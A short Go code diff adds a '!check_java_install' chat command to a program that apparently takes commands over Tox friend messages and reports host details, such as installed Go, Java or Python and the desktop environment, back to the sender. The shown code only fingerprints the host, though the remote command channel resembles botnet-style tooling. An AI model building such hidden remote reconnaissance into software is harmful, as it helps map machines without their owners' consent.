@@ -198,6 +198,9 @@ func main() {
                     } else if string(message) == "!check_go_install" {
                         message := fmt.Sprintf("go %v", checkGoInstall())
                         t.FriendSendMessage(friendNumber, message)
+                    } else if string(message) == "!check_java_install" {
+                        message := fmt.Sprintf("java %v", checkJavaInstall())
+                        t.FriendSendMessage(friendNumber, message)
                     } else if string(message) == "!detect_de" {
                         de := detectDE()
                         t.FriendSendMessage(friendNumber, de)
@@ -472,6 +475,7 @@ func exists(path string) (bool, error) {
     return true, err
 }
 
+// Check for installed software
 func checkPython3Install() (bool) {
     installed, err := exists("/usr/bin/python3.5")
     if err != nil {
